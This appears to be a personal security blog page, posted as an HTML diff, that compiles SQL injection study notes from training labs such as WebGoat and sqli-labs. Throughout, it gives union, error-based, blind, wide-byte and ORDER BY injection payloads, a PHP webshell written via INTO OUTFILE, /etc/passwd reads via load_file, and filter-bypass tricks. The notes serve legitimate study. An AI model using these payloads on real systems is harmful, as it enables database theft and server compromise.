@@ -1,0 +1,1122 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      Web漏洞整理-SQLi | Archeri&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Archeri Shade">
+  <meta name="keywords" content="" />
+  <meta name="description" content="" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 7,
+      randomYouSrc: '/img/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「Web漏洞整理-SQLi」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="https://github.com/ArcheriShade" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2023/07/07/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-SQLi/" itemprop="url">
+		Web漏洞整理-SQLi
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2023/07/07/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-SQLi/" itemprop="url">
+		<time datetime="2023-07-07T09:41:31.000Z" itemprop="dateUpdated">
+	  		2023-07-07
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/Web/" class=" ">
+			Web
+		</a>
+	
+		<a href="/tags/SQLi/" class=" ">
+			SQLi
+		</a>
+	
+		<a href="/tags/%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" class=" ">
+			漏洞整理
+		</a>
+	
+		
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1 id="NOTE-SQLi"><a href="#NOTE-SQLi" class="headerlink" title="[NOTE] SQLi"></a>[NOTE] SQLi</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要是之前练习了很多靶场<br>所设计到的SQLi的笔记都比较分散<br>这里就系统地整理下，主要是整合到一起，方便以后查阅</p>
+<p>整理自靶场练习<code>Webgoat</code>、<code>pikachu</code>、<code>Web For Pentester</code>、<code>XVWA</code>、<code>sqli-labs</code></p>
+<h2 id="NOT、AND和OR的计算优先级"><a href="#NOT、AND和OR的计算优先级" class="headerlink" title="NOT、AND和OR的计算优先级"></a>NOT、AND和OR的计算优先级</h2><p>关于NOT、OR、AND的计算优先级顺序：<br><strong>NOT&gt;AND&gt;OR</strong></p>
+<p>所以有如下例子：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">From</span> user_data <span class="keyword">WHERE</span> Login_Count <span class="operator">=</span> <span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> userid<span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>先计算“1 &#x3D; 1 AND userid&#x3D; 1”，得false</li>
+<li>再计算“Login_Count &#x3D; 1 OR false”，得false</li>
+<li>所以总体为false，注入失败</li>
+</ol>
+<p>再有如下例子：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">From</span> user_data <span class="keyword">WHERE</span> Login_Count <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> userid<span class="operator">=</span> <span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>先计算“Login_Count &#x3D; 1 AND userid&#x3D; 1”，得false</li>
+<li>再计算“false OR 1&#x3D;1”，得true</li>
+<li>所以总体为true，注入成功</li>
+</ol>
+<h2 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h2><p>大概，主要是like语句，与‘%’的配合使用<br>例如<code>select * from users where username like &#39;%婉%&#39;</code><br>这样会搜索出username像“X婉”、“X婉X”、“婉XXXX”等有“婉”的记录</p>
+<p>几个主要的符号：</p>
+<ul>
+<li>%：表示任意0个或多个字符。可匹配任意类型和长度的字符，有些情况下若是中文，请使用两个百分号（%%）表示</li>
+<li>_：表示任意单个字符。匹配单个任意字符，它常用来限制表达式的字符长度语句</li>
+<li>[]：匹配一个正则表达式</li>
+</ul>
+<p>主动闭合的话一般要闭合百分号和引号</p>
+<h2 id="UNION-JOINS"><a href="#UNION-JOINS" class="headerlink" title="UNION&amp;JOINS"></a>UNION&amp;JOINS</h2><p>基本上都是用于合并查询结果，或者是用于一次查询获取多个结果<br>区别在于：</p>
+<ul>
+<li>UNION要求多个SELECT之间查询的<strong>字段数目和类型</strong>都是一样的</li>
+<li>JOINS使用两份数据之间的某种<strong>联系</strong>来合并多行</li>
+</ul>
+<p>使用union可以使用‘a’、’b’、’c’或1、2、3等来代替空缺的字段<br>从而使多个select之间字段数目和类型都相同</p>
+<p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> user_data <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> userid,user_name, password, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="number">1</span> <span class="keyword">from</span> user_system_data <span class="comment">--&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="updatexml函数的使用场景"><a href="#updatexml函数的使用场景" class="headerlink" title="updatexml函数的使用场景"></a>updatexml函数的使用场景</h2><p>一般来说，只要<strong>有使用SQL语句</strong>，并且<strong>有完整报错</strong><br>都可以使用updatexml注入</p>
+<p>不管是update注入、insert注入、delete注入还是header注入啥的</p>
+<p>总之就是强</p>
+<p>就是要配合<code>limit</code>语句进行偏移显示</p>
+<p>另一个类似的函数是<code>extractvalue</code>：对XML文档进行查询的函数<br>语法：extractvalue(目标xml文档，xml路径)</p>
+<hr>
+<p>异曲同工的还有<strong>双查询注入</strong></p>
+<p><code>?id=1&#39; union select 1, concat((select database()), floor(rand(14)*2)) as c, count(*) from information_schema.tables group by c %23</code></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wn314/article/details/89297560">MySQL中Double Injection原理浅析</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/786aa540a900?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation">sqli-labs level5-6 双查询注入</a></p>
+<h2 id="宽字节注入（绕过加斜杠转义）"><a href="#宽字节注入（绕过加斜杠转义）" class="headerlink" title="宽字节注入（绕过加斜杠转义）"></a>宽字节注入（绕过加斜杠转义）</h2><p>主要是利用了GBK系列编码，<strong>将两个字节当成是一个中文字符</strong>的原理</p>
+<p>相关配置为：<code>set character_set_client = gbk</code></p>
+<p>一般为引号被加上反斜杠转义的情况<br><code>1&#39; and 1=1 #</code>-&gt;<code>1\&#39; and 1=1 #</code><br>相当于查询id为‘1’ and 1&#x3D;1 #’的信息</p>
+<p>但是可以主动加上一个‘%df’<br><code>1%df&#39; and 1=1 #</code>-&gt;<code>1%df\&#39; and 1=1 #</code>-&gt;<code>1%df%5c&#39; and 1=1 #</code>-&gt;<code>1輼&#39; and 1=1 #</code><br>相当于查询id为‘1輼’的信息，然后执行and后面的判断</p>
+<p>此外需要用到字符串判断的地方，比如要<code>table_name=&#39;users&#39;</code><br>可以使用**<code>concat</code>函数<strong>和</strong><code>char</code>函数**来进行结合变式</p>
+<p><code>?id=999 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=concat(char(117),char(115),char(101),char(114),char(115)) %23</code></p>
+<h2 id="使用判断语句进行盲注"><a href="#使用判断语句进行盲注" class="headerlink" title="使用判断语句进行盲注"></a>使用判断语句进行盲注</h2><p>主要有俩</p>
+<p>一个<code>case-when-then-else-end</code><br>?order&#x3D;id`, (case when (1&#x3D;2) then `name` else `age` end) %23</p>
+<p>另一个<code>if</code>函数<br><code>/?id=&#39; or if(1=1,sleep(1),0) %23</code></p>
+<h2 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY `&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[<span class="string">&quot;order&quot;</span>]).<span class="string">&quot;`&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>MySQL里面的<code>order by</code>后面跟的排列字段只有以下两种形式：</p>
+<ul>
+<li>直接跟列名：order by name</li>
+<li>跟<strong>反点</strong>之间的列名：order by `name`</li>
+</ul>
+<p>此外源码里面还使用了<code>mysql_real_escape_string</code>函数，单双引号、回车制表、反斜杠以及<code>\x00</code>等都会被转义<br>就是没有转义“`”</p>
+<p>这里还要结合一下<code>order by</code>可以多字段排列的特点<br>以及使用<code>case-when-then-else-end</code>句式</p>
+<p>示例payload：*?order&#x3D;id`, (case when (1&#x3D;2) then `name` else `age` end) %23*<br>首先是主动闭合，先将查询结果按<code>id</code>字段排列<br>后面的句式是关键，<code>when</code>里面添加判断语句<br>为真则进一步按<code>name</code>字段排列，否则按<code>age</code>字段排列</p>
+<p><code>when</code>里面可以替换成别的判断<br>返回结果会根据真假是否成立从而形成不同的显示结果<br>从而形成<strong>盲注</strong>的效果</p>
+<hr>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[<span class="string">&quot;order&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>和上题类似，只不过是使用了<code>order by</code>的另一种字段使用方法：直接拼接</p>
+<p>由于不用使用“`”去主动闭合，可以做到只用一个字段排列<br>返回结果能够根据<code>when</code>的判断结果而不一样了<br>真正做到了盲注</p>
+<h3 id="和预编译之间的相性（from-WebGoat）"><a href="#和预编译之间的相性（from-WebGoat）" class="headerlink" title="和预编译之间的相性（from WebGoat）"></a>和预编译之间的相性（from WebGoat）</h3><p>即使后端做了预处理或者其他操作来防止SQL注入，前端也依旧需要输入过滤<br>防止XSS、信息泄露等其他安全威胁</p>
+<p>预编译不能完全防止SQL注入<br>原因….感觉复杂，一大段话：</p>
+<blockquote>
+<p>This means an <strong>orderExpression</strong> can be a <strong>selectExpression</strong> which can be a function as well, so for example with a case statement we might be able to ask the database some questions, like:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="literal">TRUE</span>) <span class="keyword">THEN</span> lastname <span class="keyword">ELSE</span> firstname)</span><br></pre></td></tr></table></figure>
+
+<p>So we can substitute any kind of boolean operation in the <strong>when(….)</strong> part. The statement will just work because it is a valid query whether you use a prepared statement or not. An order by clause can by definition contain an expression.</p>
+</blockquote>
+<p>进一步缓解：</p>
+<blockquote>
+<p>If you need to provide a sorting column in your web application you should implement a whitelist to validate the value of the order by statement. It should always be limited to something like ‘first name’ or ‘last name’.</p>
+</blockquote>
+<p>后面有例子：<br>可以选择某个列进行排列，发现会发送GET请求，有个column参数<br>改成payload：column&#x3D;(CASE WHEN (TRUE) THEN ip ELSE hostname END)<br>看看会不会按ip排列，从而判断有没有注入<br>然后构造<strong>WHEN()里面的表达式</strong>，形成类似于<strong>盲注</strong>的注入情况</p>
+<p>日后补充：因为<code>order by</code>后续需要接字段名，预编译的话会自动加引号，所以<code>order by</code>后续很少使用预编译，不然会爆语法错误<br>总之就是，预编译与<code>order by</code>相性不好，<strong>排序注入</strong>存在可能</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>常用：</p>
+<ul>
+<li>floor（双重报错注入）</li>
+<li>extractvalue</li>
+<li>updatexml</li>
+</ul>
+<p>不常用</p>
+<ul>
+<li>geometrycollection<br><code>select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</code></li>
+<li>multipoint<br><code>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</code></li>
+<li>polygon<br><code>select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</code></li>
+<li>multipolygon<br><code>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</code></li>
+<li>linestring<br><code>select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</code></li>
+<li>multilinestring<br><code>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</code></li>
+<li>exp<br><code>select * from test where id=1 and exp(~(select * from(select user())a));</code></li>
+</ul>
+<h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p><strong>into outfile</strong>：写多行，适用于写文本<br><strong>into dumpfile</strong>：写单行，适用于写二进制文件</p>
+<hr>
+<p>若<code>current_user</code>有对应目录的写权限，则可以将查询结果写入到文件，并保存到目标服务器中</p>
+<p><strong>dump 数据</strong><br><code>union select * from somewhere into outfile &quot;/target/path/data.txt&quot;</code></p>
+<p><strong>写入webshell</strong><br><code>union select &quot;&lt;?php @system($_POST[&#39;hack&#39;]); ?&gt;&quot;,2,3 into outfile &quot;/target/path/hack.php&quot;</code></p>
+<hr>
+<p>**load_file()**：读取文件内容</p>
+<p>无需获取文件本身，读取文件内容的技巧</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> hacktmp(line <span class="type">BLOB</span>);</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,hex(load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>)),<span class="number">1</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;/tmp/hacktmp&#x27;</span>;</span><br><span class="line">load data infile <span class="string">&#x27;/tmp/hacktmp&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> hacktmp;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="过滤引号（禁显式字符串）"><a href="#过滤引号（禁显式字符串）" class="headerlink" title="过滤引号（禁显式字符串）"></a>过滤引号（禁显式字符串）</h3><p>需要用到字符串判断的地方，比如要<code>table_name=&#39;users&#39;</code><br>可以使用**<code>concat</code>函数<strong>和</strong><code>char</code>函数**来进行结合变式</p>
+<p><code>?id=999 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=concat(char(117),char(115),char(101),char(114),char(115)) %23</code></p>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>用别的空白字符，如制表符啥的</p>
+<p>用块注释分隔<code>/**/</code></p>
+<p>巧用圆括号对SQL的每一段进行分隔</p>
+<h3 id="过滤单行注释"><a href="#过滤单行注释" class="headerlink" title="过滤单行注释"></a>过滤单行注释</h3><p>就是过滤掉了<code>#</code>和<code>--</code>，使用00截断：<code>?id=&#39; or 1=1; %00</code></p>
+<h3 id="过滤特定关键字"><a href="#过滤特定关键字" class="headerlink" title="过滤特定关键字"></a>过滤特定关键字</h3><p>若有过滤，先判断是一次性过滤还是非一次性过滤</p>
+<p><strong>一次性</strong>的话：双写绕过</p>
+<p><strong>非一次性</strong>的话：则要考虑变形</p>
+<ul>
+<li><p>大小写混拼</p>
+</li>
+<li><p>运算符代替：<code>or</code>-&gt;<code>||</code>、<code>and</code>-&gt;<code>&amp;&amp;</code></p>
+</li>
+<li><p>URL编码绕过：<code>#</code>-&gt;<code>%23</code></p>
+</li>
+<li><p>Hex编码绕过：<code>~</code>-&gt;<code>0x7e</code></p>
+</li>
+<li><p>添加注释：<code>/*or*/</code></p>
+</li>
+</ul>
+<p>双拼？<br>大小写混拼？<br>运算符替换？<br>过滤的只是特定组合？（<code>union select</code>换成<code>union all select</code>？）</p>
+<h3 id="仅限数字"><a href="#仅限数字" class="headerlink" title="仅限数字"></a>仅限数字</h3><p>可能使用的是<code>preg_match</code>函数，捕获到第一个数字之后就通过了</p>
+<p>所以可以<code>?id=999 union select 1,2,3,4,5 %23</code>碰碰运气</p>
+<p>官方文档也是这样说的：</p>
+<blockquote>
+<p>**preg_match()<strong>返回 <code>pattern</code> 的匹配次数。  它的值将是0次（不匹配）或1次，因为</strong>preg_match()**在第一次匹配后  将会停止搜索。</p>
+</blockquote>
+<p>或者换个地方，要求最后面有数字试试</p>
+<p>此外<code>preg_match</code>只会匹配一次<br>如果是多行模式的话即会逐行匹配，而不是匹配整个字符串的开头和结尾</p>
+<p>就可以这样构造payload：<code>123\nPAYLOAD</code></p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/post-cover/WebVuln1.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<!-- <div>分享</div> -->
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+		
+			<a href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" title="Linux攻防-权限维持及痕迹隐藏" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">
+								Web靶场-upload-labs			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								环境攻击机：kali 10.10.10.128靶机：Debian 11.1 x64 
+Pass-01任务：上传一个webshell到服务器
+直接怼，显示：
+
+改成basic.jpg，点击上传后bp抓包，修改后缀为.php，上传成功了：...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-upload-labs"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">
+								PHP-Web渗透中常见的高危函数以及伪协议			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								代码执行函数eval
+代码：&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;
+利用：http://10.10.10.3/test.php?cmd=phpinfo();
+assert
+代码：&lt;?...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/PHP.png" alt="PHP-Web渗透中常见的高危函数以及伪协议"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">
+								Webshell流量分析			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 1日, 2023				
+							</p>
+							<p class="relate-post-content">
+								菜刀一句话在这里：&lt;?php eval($_POST[&#39;myhack&#39;]) ?&gt;
+用的某个工具包里的菜刀，流量如下：
+
+agent有火狐5.0以及百度
+连接密码开头，用了array_map封装命令执行函数，...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/oiiai.jpg" alt="Webshell流量分析"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">
+								sqli-labs Stacked Injections			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 30日, 2023				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] sqli-labs Stacked Injections前言针对sqli-labs靶场的做题笔记
+环境虚拟机环境攻击机：kali | 10.10.10.1靶机：Debian 11.1 | 10.10.10.3 | Apa...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="sqli-labs Stacked Injections"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">
+								Web靶场-DSVW			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 25日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] DSVW靶场练习笔记前言是针对DSVW靶场的练习笔记是在搞完Pikachu靶场之后在整理vulnstack的Web安全入门进阶靶场时发现的里面版本比较老，就单独搞出来玩玩
+最新版本v0.2b用Python 3运行代码很顶...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-DSVW"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">
+								Web靶场-Pikachu			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 6日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Pikachu靶场练习笔记前言是针对Pikachu靶场的练习笔记是在搞完WebGoat之后想着再找一个靶场玩玩
+环境攻击者：Kali Linux | 10.10.10.1靶机：Ubuntu | 10.10.10.2 | ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-Pikachu"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">
+								一些BurpSuite进阶使用			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 10日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Burp Suite进阶前言目前只是些平时练习过程中接触到的BP进阶使用方法和技巧
+后续再考虑找些专门的教程学学
+使用宏抓取页面token下面以抓取pikachu靶场爆破模块的token为例
+来自于g0tmi1k的文章
+...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/burpsuite.png" alt="一些BurpSuite进阶使用"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/01/16/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-XSS/" title="Web漏洞整理-XSS">
+								Web漏洞整理-XSS			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								一月 16日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] XSS前言主要是之前练习了很多靶场所设计到的XSS的笔记都比较分散这里就系统地整理下，主要是整合到一起，方便以后查阅
+整理自靶场练习Webgoat、pikachu、Web For Pentester、XVWA以及一个很有...
